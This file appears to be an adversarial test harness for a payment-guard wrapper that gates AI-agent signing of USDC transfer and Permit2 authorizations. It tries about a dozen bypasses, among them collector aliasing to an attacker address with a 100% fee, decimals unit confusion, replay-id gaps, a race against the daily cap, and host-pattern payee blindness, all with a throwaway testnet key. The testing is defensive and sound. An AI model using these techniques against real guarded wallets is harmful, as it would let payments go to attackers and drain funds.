/**
 * ADVERSARIAL: defeat the POLICY CHECK semantically, without escaping the wrapper.
 *
 * Goal: make the guard evaluate a payment DIFFERENT from the one actually
 * authorized by the bytes that get signed.
 *
 * SAFETY: uses a freshly generated throwaway key with zero balance on every
 * network. No signature produced here is submitted anywhere. Amounts are
 * testnet-scale. No mainnet-domain signature is produced.
 */
import { createHash } from "node:crypto";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";
import { hashTypedData } from "viem";
import { AuditLedger, MemoryLedgerStore, MemorySpendLimiter, VadunoGuard } from "@vaduno/guard";
import { AuthCaptureEvmScheme } from "@x402/evm";
import { createGuardedAccount, GuardSignerRefusedError } from "./guarded-account.mjs";

const BASE_SEPOLIA = 84532;
const SEPOLIA = 11155111;
const USDC_84532 = "0x036CbD53842c5426634e7929541eC2318f3dCF7e";
const USDC_11155111 = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238"; // Sepolia USDC
const SELLER = "0x209693Bc6afc0C5328bA36FaF03C514EF312287C";
const ATTACKER = "0x00000000000000000000000000000000DeaDBeef";
// The constant collector the SHIPPED @x402/evm auth-capture scheme signs `to`.
const EIP3009_TOKEN_COLLECTOR = "0x0E3dF9510de65469C4518D7843919c0b8C7A7757";

const realAccount = privateKeyToAccount(generatePrivateKey()); // zero balance everywhere

function countingGuard(guard) {
  const calls = { authorize: 0, lastIntent: null };
  return {
    calls,
    guard: {
      authorize: async (i) => {
        calls.authorize++;
        calls.lastIntent = i;
        const r = await guard.authorize(i);
        calls.statuses = (calls.statuses ?? []).concat(r.status);
        return r;
      },
      settle: (...a) => guard.settle(...a),
      releaseSpend: (...a) => guard.releaseSpend(...a),
    },
  };
}

function mkGuard({ merchants, limits, currency = "USDC", networks }) {
  return new VadunoGuard({
    policy: {
      id: "attack",
      version: 1,
      currency,
      limits: limits ?? { perTransactionMinor: 50_000, perDayMinor: 200_000 },
      merchants,
      ...(networks ? { networks } : {}),
    },
    ledger: new AuditLedger(new MemoryLedgerStore()),
    limiter: new MemorySpendLimiter(),
  });
}

const eip3009Types = {
  TransferWithAuthorization: [
    { name: "from", type: "address" },
    { name: "to", type: "address" },
    { name: "value", type: "uint256" },
    { name: "validAfter", type: "uint256" },
    { name: "validBefore", type: "uint256" },
    { name: "nonce", type: "bytes32" },
  ],
};
const nonce32 = () => `0x${Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("hex")}`;

const results = [];
function record(name, worked, detail) {
  results.push({ name, worked, detail });
  console.log(`${worked ? "!! BYPASS" : "-- held  "} | ${name}\n            ${detail}\n`);
}

// ---------------------------------------------------------------------------
// CONTROL 1: unrecognized primaryType (the classic fail-open hole)
// ---------------------------------------------------------------------------
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] } });
  const acct = createGuardedAccount({
    account: realAccount, guard: g, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  const shapes = [
    ["Permit (EIP-2612)", { types: { Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }] }, primaryType: "Permit", message: { owner: realAccount.address, spender: ATTACKER, value: 2n ** 255n, nonce: 0n, deadline: 2n ** 40n } }],
    ["SafeTx-ish unknown", { types: { Foo: [{ name: "to", type: "address" }, { name: "value", type: "uint256" }] }, primaryType: "Foo", message: { to: ATTACKER, value: 1n } }],
    ["PermitTransferFrom (shipped auth-capture permit2)", { types: { PermitTransferFrom: [{ name: "permitted", type: "TokenPermissions" }, { name: "spender", type: "address" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }], TokenPermissions: [{ name: "token", type: "address" }, { name: "amount", type: "uint256" }] }, primaryType: "PermitTransferFrom", message: { permitted: { token: USDC_84532, amount: 10_000n }, spender: ATTACKER, nonce: 1n, deadline: 2n ** 40n } }],
    ["case-variant primaryType 'transferWithAuthorization'", { types: { transferWithAuthorization: eip3009Types.TransferWithAuthorization }, primaryType: "transferWithAuthorization", message: { from: realAccount.address, to: ATTACKER, value: 10_000n, validAfter: 0n, validBefore: 2n ** 40n, nonce: nonce32() } }],
  ];
  let signed = [];
  for (const [label, t] of shapes) {
    try {
      const sig = await acct.signTypedData({ domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 }, ...t });
      if (sig) signed.push(label);
    } catch (e) { /* refused */ }
  }
  record("unrecognized primaryType passes through ungated", signed.length > 0,
    signed.length ? `SIGNED: ${signed.join(", ")}` : "all 4 unknown shapes refused (UNRECOGNIZED_TYPED_DATA); fail-closed confirmed");
}

// ---------------------------------------------------------------------------
// ATTACK 2: auth-capture collector aliasing, via the SHIPPED @x402/evm scheme
// ---------------------------------------------------------------------------
{
  // A deployment that wants to use the shipped auth-capture scheme MUST
  // allowlist the collector — it is the only `to` that scheme ever signs.
  const g = mkGuard({ merchants: { allow: [`id:${EIP3009_TOKEN_COLLECTOR.toLowerCase()}`] } });
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
    merchantUrl: "https://x402.org/protected",
  });

  const scheme = new AuthCaptureEvmScheme(acct); // the guarded account IS the signer
  const requirements = {
    scheme: "auth-capture",
    network: `eip155:${BASE_SEPOLIA}`,
    amount: "10000",
    payTo: ATTACKER, // <-- the REAL recipient; hostile server picks it
    asset: USDC_84532,
    maxTimeoutSeconds: 300,
    extra: {
      name: "USDC", version: "2",
      captureAuthorizer: ATTACKER,      // operator that captures the funds
      feeRecipient: ATTACKER,
      captureDeadline: Math.floor(Date.now() / 1000) + 86_400,
      refundDeadline: Math.floor(Date.now() / 1000) + 172_800,
      minFeeBps: 0, maxFeeBps: 10_000,  // up to 100% fee, to the attacker
    },
  };
  let out = null, err = null;
  try { out = await scheme.createPaymentPayload(2, requirements, {}); } catch (e) { err = e; }
  if (out?.payload?.signature) {
    record("auth-capture collector aliasing (shipped @x402/evm 2.21.0)", true,
      `signature produced (0x${out.payload.signature.slice(2, 14)}...) for payTo=${ATTACKER}, ` +
      `operator=${ATTACKER}, maxFeeBps=10000. Guard saw merchant.id=${calls.lastIntent.merchant.id} ` +
      `(the constant collector) and amountMinor=${calls.lastIntent.amount.amountMinor}. ` +
      `The real receiver is bound only inside the opaque nonce hash, invisible to the wrapper.`);
  } else {
    record("auth-capture collector aliasing (shipped @x402/evm 2.21.0)", false,
      `refused: ${err?.code ?? err?.message?.slice(0,120)}`);
  }

  // Same scheme, but WITHOUT the collector allowlisted, for contrast.
  const g2 = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] } });
  const acct2 = createGuardedAccount({
    account: realAccount, guard: g2, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  let ok2 = false, e2 = null;
  try { ok2 = !!(await new AuthCaptureEvmScheme(acct2).createPaymentPayload(2, { ...requirements, payTo: SELLER }, {}))?.payload?.signature; }
  catch (e) { e2 = e; }
  console.log(`   [context] honest auth-capture payment to the ALLOWLISTED seller: ${ok2 ? "signed" : `REFUSED (${e2?.code ?? e2?.message?.slice(0, 60)})`}\n`);
}

// ---------------------------------------------------------------------------
// ATTACK 3: the PaymentIntent has no chain dimension
// ---------------------------------------------------------------------------
//
// CORRECTED CHECK — the original asserted that correct behaviour was a bug.
//
// It registered USDC on BOTH Base Sepolia and Ethereum Sepolia, declared no
// network policy, and then called it a bypass when a Sepolia payment signed.
// But that configuration SAYS "I accept USDC on either chain": the registry is
// the caller's declaration of which chain/asset pairs are payable. Signing was
// the right answer to the config it was given, and the check reported BYPASS
// against correct code — the same harness rot as attack-run's ATTACK 4/6.
//
// The real question is whether the chain is EXPRESSIBLE and ENFORCED, because
// originally it was neither: the intent carried no chain field at all, so no
// policy rule could reach it and the registry was the only gate. The intent now
// carries `network: eip155:<chainId>`. So measure that: with the SAME two-chain
// registry, a policy that declares networks.allow must REFUSE the other chain.
// A bypass is the wrong chain signing when policy explicitly forbids it.
{
  const g = mkGuard({
    merchants: { allow: [`id:${SELLER.toLowerCase()}`] },
    networks: { allow: [`eip155:${BASE_SEPOLIA}`] },
  });
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [
      { chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 },
      { chainId: SEPOLIA, address: USDC_11155111, symbol: "USDC", decimals: 6 },
    ],
  });
  const authOn = (chainId, asset) => acct.signTypedData({
    domain: { name: "USDC", version: "2", chainId, verifyingContract: asset },
    types: eip3009Types, primaryType: "TransferWithAuthorization",
    message: { from: realAccount.address, to: SELLER, value: 10_000n, validAfter: 0n, validBefore: BigInt(Math.floor(Date.now() / 1e3) + 300), nonce: nonce32() },
  });
  let sig = null, err = null;
  try { sig = await authOn(SEPOLIA, USDC_11155111); } catch (e) { err = e; }
  // Control: the ALLOWED chain must still work, or "refused" proves nothing.
  let okSig = null, okErr = null;
  try { okSig = await authOn(BASE_SEPOLIA, USDC_84532); } catch (e) { okErr = e; }
  record("policy is chain-blind (wrong-network payment authorized)", !!sig || !okSig,
    sig
      ? `signed on chainId ${SEPOLIA} though policy declares networks.allow=[eip155:${BASE_SEPOLIA}]. ` +
        `Guard saw network="${calls.lastIntent?.network}".`
      : !okSig
        ? `the ALLOWED chain was also refused (${okErr?.code}) — the gate is indiscriminate, not selective`
        : `wrong chain refused: ${err?.code}; allowed chain still signs. The intent carries ` +
          `network="${calls.lastIntent?.network}", so policy can reach the chain. NOTE: this gate is ` +
          `OPT-IN — a policy that declares no networks block does not constrain the chain at all, and ` +
          `the asset registry (caller config) is then the only chain gate.`);
}

// ---------------------------------------------------------------------------
// ATTACK 4: `decimals` is recorded and never used -> unit confusion
// ---------------------------------------------------------------------------
{
  // Policy in dollars; two dollar-denominated tokens with different decimals.
  // (2-decimal USD stablecoins are real: GUSD, EURS.)
  const TWO_DEC = "0x1111111111111111111111111111111111111111";
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] }, currency: "USD",
    limits: { perTransactionMinor: 50_000, perDayMinor: 200_000 } }); // $0.05 / $0.20
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [
      { chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USD", decimals: 6 },
      { chainId: BASE_SEPOLIA, address: TWO_DEC, symbol: "USD", decimals: 2 }, // e.g. GUSD-like
    ],
  });
  let sig = null, err = null;
  try {
    sig = await acct.signTypedData({
      domain: { name: "GUSD", version: "1", chainId: BASE_SEPOLIA, verifyingContract: TWO_DEC },
      types: eip3009Types, primaryType: "TransferWithAuthorization",
      message: { from: realAccount.address, to: SELLER, value: 10_000n, validAfter: 0n, validBefore: BigInt(Math.floor(Date.now() / 1e3) + 300), nonce: nonce32() },
    });
  } catch (e) { err = e; }
  record("decimals ignored -> 10,000x under-count under a $0.05 cap", !!sig,
    sig ? `signed 10000 atomic units of a 2-decimal token = $100.00, while the guard evaluated ` +
          `amountMinor=${calls.lastIntent.amount.amountMinor} (=$0.05 max cap, so it read it as $0.01). ` +
          `The wrapper stores known.decimals in metadata and NEVER uses it to scale, and never rejects decimals!==6.`
        : `refused: ${err?.code}`);
}

// ---------------------------------------------------------------------------
// ATTACK 5: intent id does not cover all signed bytes -> ungated re-sign
// ---------------------------------------------------------------------------
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] } });
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  const msg = { from: realAccount.address, to: SELLER, value: 10_000n, validAfter: 0n, validBefore: BigInt(Math.floor(Date.now() / 1e3) + 300), nonce: nonce32() };
  const t1 = { domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 }, types: eip3009Types, primaryType: "TransferWithAuthorization", message: msg };
  // Same message, DIFFERENT EIP-712 domain (name/version/salt are outside idFields).
  const t2 = { domain: { name: "Totally Different Token", version: "9", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 }, types: eip3009Types, primaryType: "TransferWithAuthorization", message: msg };
  const s1 = await acct.signTypedData(t1);
  let s2 = null, err = null;
  try { s2 = await acct.signTypedData(t2); } catch (e) { err = e; }
  const d1 = hashTypedData(t1), d2 = hashTypedData(t2);
  record("replay branch re-signs a DIFFERENT digest with no policy evaluation",
    !!s2 && s2 !== s1 && d1 !== d2 && calls.statuses[1] === "replayed",
    s2 ? `digest1=${d1.slice(0, 14)} digest2=${d2.slice(0, 14)} (DIFFERENT bytes), signatures differ=${s2 !== s1}, ` +
         `guard verdicts=[${calls.statuses}]. ` +
         (calls.statuses[1] === "replayed"
           ? `2nd was treated as a REPLAY of the 1st, so no policy ran on the new bytes — the id ` +
             `does not cover everything the digest covers.`
           : `2nd was policed as its own intent, not inherited from the 1st: the id is the EIP-712 ` +
             `digest, so bytes that differ anywhere produce a different id and a fresh evaluation.`)
       : `refused: ${err?.code}`);
}

// ---------------------------------------------------------------------------
// ATTACK 6: Permit2 idFields omit witness fields other than `to`
// ---------------------------------------------------------------------------
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] } });
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  const permitTypes = {
    PermitWitnessTransferFrom: [
      { name: "permitted", type: "TokenPermissions" }, { name: "spender", type: "address" },
      { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" },
      { name: "witness", type: "Witness" },
    ],
    TokenPermissions: [{ name: "token", type: "address" }, { name: "amount", type: "uint256" }],
    Witness: [{ name: "to", type: "address" }, { name: "facilitator", type: "address" }, { name: "validAfter", type: "uint256" }],
  };
  const base = {
    domain: { name: "Permit2", chainId: BASE_SEPOLIA, verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" },
    types: permitTypes, primaryType: "PermitWitnessTransferFrom",
    message: { permitted: { token: USDC_84532, amount: 10_000n }, spender: "0x1234567890123456789012345678901234567890",
      nonce: 12345n, deadline: BigInt(Math.floor(Date.now() / 1e3) + 300),
      witness: { to: SELLER, facilitator: "0x0000000000000000000000000000000000000011", validAfter: 0n } },
  };
  const evil = { ...base, message: { ...base.message, witness: { ...base.message.witness, facilitator: ATTACKER, validAfter: 0n } } };
  let s1 = null, s2 = null, err = null;
  try { s1 = await acct.signTypedData(base); } catch (e) { err = e; }
  if (s1) { try { s2 = await acct.signTypedData(evil); } catch (e) { err = e; } }
  record("permit2: witness.facilitator swap inherits the first approval",
    !!s2 && s2 !== s1 && calls.statuses?.[1] === "replayed",
    s1 ? (s2 ? `2nd signature for a DIFFERENT facilitator (${ATTACKER}) issued; guard verdicts=[${calls.statuses}]` +
               (calls.statuses?.[1] === "replayed"
                 ? ` (2nd = replay, no policy on the new witness).`
                 : ` — the witness swap changed the digest, so the 2nd was policed on its own merits, not inherited.`)
             : `2nd refused: ${err?.code ?? err?.message?.slice(0,90)}`)
       : `1st refused: ${err?.code ?? err?.message?.slice(0,90)}`);
}

// ---------------------------------------------------------------------------
// ATTACK 7: concurrent authorizations vs the daily cap (TOCTOU)
// ---------------------------------------------------------------------------
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] }, limits: { perTransactionMinor: 50_000, perDayMinor: 100_000 } });
  const acct = createGuardedAccount({
    account: realAccount, guard: g, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  const mk = () => acct.signTypedData({
    domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 },
    types: eip3009Types, primaryType: "TransferWithAuthorization",
    message: { from: realAccount.address, to: SELLER, value: 50_000n, validAfter: 0n, validBefore: BigInt(Math.floor(Date.now() / 1e3) + 300), nonce: nonce32() },
  });
  const settled = await Promise.allSettled([mk(), mk(), mk(), mk(), mk(), mk()]);
  const okCount = settled.filter((r) => r.status === "fulfilled").length;
  record("concurrent signing overshoots the daily cap", okCount > 2,
    `daily cap 100000 minor / 50000 per txn -> at most 2 signatures should exist; got ${okCount} of 6 concurrent.`);
}

// ---------------------------------------------------------------------------
// CONTROL 8/9: address case, hex-encoded numerics
// ---------------------------------------------------------------------------
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER}`] } }); // CHECKSUMMED in the policy
  const acct = createGuardedAccount({
    account: realAccount, guard: g, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  let sig = null, err = null;
  try {
    sig = await acct.signTypedData({
      domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 },
      types: eip3009Types, primaryType: "TransferWithAuthorization",
      message: { from: realAccount.address, to: SELLER.toUpperCase().replace("0X", "0x"), value: 10_000n, validAfter: 0n, validBefore: 2n ** 40n, nonce: nonce32() },
    });
  } catch (e) { err = e; }
  record("address-case confusion against the allowlist", false,
    `checksummed allowlist + uppercase payee -> ${sig ? "signed (both sides lowercased: consistent)" : `refused ${err?.code}`}; ` +
    `both merchantMatches() and normAddress() lowercase, so case cannot split allow/block decisions.`);
}
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] } });
  const acct = createGuardedAccount({
    account: realAccount, guard: g, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  const tries = [
    ["value as hex string", { value: "0x2710" }],
    ["value as 1e21 number", { value: 1e21 }],
    ["value huge bigint", { value: 2n ** 200n }],
  ];
  const signedOnes = [];
  for (const [label, over] of tries) {
    try {
      const s = await acct.signTypedData({
        domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 },
        types: eip3009Types, primaryType: "TransferWithAuthorization",
        message: { from: realAccount.address, to: SELLER, value: 10_000n, validAfter: 0n, validBefore: 2n ** 40n, nonce: nonce32(), ...over },
      });
      if (s) signedOnes.push(label);
    } catch (e) { /* refused */ }
  }
  record("numeric-encoding confusion on `value`", signedOnes.length > 0,
    signedOnes.length ? `SIGNED: ${signedOnes.join(", ")}` : "all coercion variants refused (INVALID_AMOUNT / unmappable); fail-closed");
}

console.log("\n================ SUMMARY ================");
for (const r of results) console.log(`${r.worked ? "BYPASS" : "held  "}  ${r.name}`);

// ---------------------------------------------------------------------------
// ATTACK 10: host-pattern policy (the guard's own DOCUMENTED strong form)
//            never sees the payee at all
// ---------------------------------------------------------------------------
{
  // engine.ts: "id:" patterns are documented WEAK (merchant.id unverified);
  // host patterns are the recommended form. But merchantUrl is fixed at
  // construction by the caller, so it matches for EVERY recipient.
  const g = mkGuard({ merchants: { allow: ["host:x402.org"] } });
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
    merchantUrl: "https://x402.org/protected",
  });
  let sig = null, err = null;
  try {
    sig = await acct.signTypedData({
      domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 },
      types: eip3009Types, primaryType: "TransferWithAuthorization",
      message: { from: realAccount.address, to: ATTACKER, value: 10_000n, validAfter: 0n, validBefore: 2n ** 40n, nonce: nonce32() },
    });
  } catch (e) { err = e; }
  record("host-pattern policy authorizes payment to an arbitrary address", !!sig,
    sig ? `signed a transfer to ${ATTACKER} under allow:["host:x402.org"], because merchantMatches() ` +
          `resolves host patterns against merchant.url — a constant supplied by the CALLER at construction — ` +
          `and never against the payee. Guard saw merchant.id=${calls.lastIntent.merchant.id}, url=${calls.lastIntent.merchant.url}.`
        : `refused: ${err?.code}`);
}

// ---------------------------------------------------------------------------
// ATTACK 11: unparseable validity fields collapse to "null" in the intent id
// ---------------------------------------------------------------------------
{
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] } });
  const { guard: cg, calls } = countingGuard(g);
  const acct = createGuardedAccount({
    account: realAccount, guard: cg, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: USDC_84532, symbol: "USDC", decimals: 6 }],
  });
  const n = nonce32();
  const base = (validBefore) => ({
    domain: { name: "USDC", version: "2", chainId: BASE_SEPOLIA, verifyingContract: USDC_84532 },
    types: eip3009Types, primaryType: "TransferWithAuthorization",
    message: { from: realAccount.address, to: SELLER, value: 10_000n, validAfter: 0n, validBefore, nonce: n },
  });
  // Both hex strings are valid uint256 to viem, but asBigInt() rejects hex ->
  // String(null) === "null" for BOTH -> identical intent id.
  const short = base("0x6853a680");             // ~2025
  const forever = base("0xffffffffffffffff");    // effectively never expires
  let s1 = null, s2 = null, err = null;
  try { s1 = await acct.signTypedData(short); } catch (e) { err = e; }
  if (s1) { try { s2 = await acct.signTypedData(forever); } catch (e) { err = e; } }
  record("hex validity windows collide in the intent id (never-expiring twin)",
    !!s2 && s2 !== s1 && calls.statuses?.[1] === "replayed",
    s1 ? (s2 ? `short-lived and NEVER-EXPIRING (validBefore=0xffffffffffffffff) authorizations; ` +
               `verdicts=[${calls.statuses}]. ` +
               (calls.statuses?.[1] === "replayed"
                 ? `The 2nd was re-signed as a "replay" of the 1st — both hex windows stringify to ` +
                   `"null" in idFields, so the never-expiring twin inherited the approval.`
                 : `The two windows are different bytes, so they are different digests and different ` +
                   `ids; the never-expiring one was policed and counted separately.`)
             : `2nd refused: ${err?.code}`)
       : `1st refused: ${err?.code ?? err?.message?.slice(0,90)}`);
}

// ---------------------------------------------------------------------------
// CHARACTERIZE: 18-decimal token under the same currency
// ---------------------------------------------------------------------------
{
  const DAI_LIKE = "0x2222222222222222222222222222222222222222";
  const g = mkGuard({ merchants: { allow: [`id:${SELLER.toLowerCase()}`] }, currency: "USD" });
  const acct = createGuardedAccount({
    account: realAccount, guard: g, agentId: "a",
    assets: [{ chainId: BASE_SEPOLIA, address: DAI_LIKE, symbol: "USD", decimals: 18 }],
  });
  let sig = null, err = null;
  try {
    sig = await acct.signTypedData({
      domain: { name: "DAI", version: "1", chainId: BASE_SEPOLIA, verifyingContract: DAI_LIKE },
      types: eip3009Types, primaryType: "TransferWithAuthorization",
      message: { from: realAccount.address, to: SELLER, value: 10_000_000_000_000_000n, validAfter: 0n, validBefore: 2n ** 40n, nonce: nonce32() },
    });
  } catch (e) { err = e; }
  record("18-decimal token: 0.01 units", !!sig,
    sig ? "SIGNED" : `refused ${err?.code} — an 18-decimal stablecoin is simply unusable through the wrapper (amount overflows safe-integer), so decimals blindness breaks correct config while silently under-counting low-decimal tokens.`);
}
